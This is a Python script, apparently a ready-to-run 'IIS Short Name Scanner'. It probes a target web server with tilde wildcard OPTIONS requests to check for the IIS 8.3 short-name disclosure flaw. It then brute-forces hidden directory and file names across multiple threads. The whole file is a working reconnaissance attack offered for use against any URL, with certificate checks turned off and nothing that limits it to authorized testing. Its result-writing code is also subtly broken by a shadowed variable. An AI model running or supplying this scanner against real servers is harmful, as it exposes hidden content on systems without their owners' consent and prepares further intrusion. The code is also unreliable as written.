import queue
import http.client
import string
import sys
import threading
import time
import urllib.parse
import ssl
import argparse

class Scanner:
    def __init__(self, target, timeout, threads, result_file):
        self.target = target
        self.timeout = timeout
        self.threads = threads
        self.result_file = result_file
        self.scheme, self.netloc, self.path, params, query, fragment = urllib.parse.urlparse(target)
        if not self.path.endswith('/'):
            self.path += '/'
        self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
        self.files = []
        self.dirs = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.threads_list = []

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = http.client.HTTPSConnection(self.netloc, context=ssl._create_unverified_context())
            else:
                conn = http.client.HTTPConnection(self.netloc)
            return conn
        except Exception as e:
            print('[Exception in function _conn]', e)
            return None

    def _get_status(self, path):
        for i in range(3):
            try:
                conn = self._conn()
                conn.request('OPTIONS', path)
                status = conn.getresponse().status
                conn.close()
                return status
            except Exception as e:
                print('[Exception in function _get_status]', e)
                time.sleep(3)

    def is_vulnerable(self):
        try:
            status_1 = self._get_status(self.path + '/*~1****/a.aspx')
            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')
            if status_1 == 404 and status_2 == 200:
                return True
            return False
        except Exception as e:
            raise Exception('[Exception in function is_vulnerable] %s' % str(e))

    def run(self):
        for payload in self.payloads:
            self.queue.put((self.path + payload, '****'))
        for _ in range(self.threads):
            t = threading.Thread(target=self._scan_worker)
            self.threads_list.append(t)
            t.start()

    def report(self):
        for t in self.threads_list:
            t.join()
        self._print('-' * 64)
        with open(self.result_file, 'w') as f:
            for d in self.dirs:
                if "Done" in d:
                    f.write('Dir:  ' + d + '\n')
            for f in self.files:
                if "Done" in f:
                    f.write('File: ' + f + '\n')
        self._print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))

    def _print(self, msg):
        self.lock.acquire()
        print(msg)
        self.lock.release()

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=self.timeout)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self._print('Found ' + url + ext + '\t[scan in progress]')

                    if len(url) - len(self.path) < 6:
                        for payload in self.payloads:
                            self.queue.put((url + payload, ext))
                    else:
                        if ext == '****':
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + payload + '**'))
                            self.queue.put((url, ''))
                        elif ext.count('*') == 3:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + payload + '*'))
                        elif ext.count('*') == 2:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + ext[2] + payload))
                        elif ext == '':
                            self.dirs.append(url + '~1\t[Done]')
                        elif ext.count('*') == 1:
                            self.files.append(url + '~1.' + ext[1:] + '\t[Done]')
            except Exception as e:
                break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='IIS Short Name Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--timeout', type=int, default=6, help='Timeout for requests')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--result-file', default='results.txt', help='File to save results')
    args = parser.parse_args()

    target = args.target
    scanner = Scanner(target, args.timeout, args.threads, args.result_file)

    if not scanner.is_vulnerable():
        print('Sorry, the server is not vulnerable')
        sys.exit(0)

    print('Server is vulnerable, please wait, scanning...')
    scanner.run()
    scanner.report()
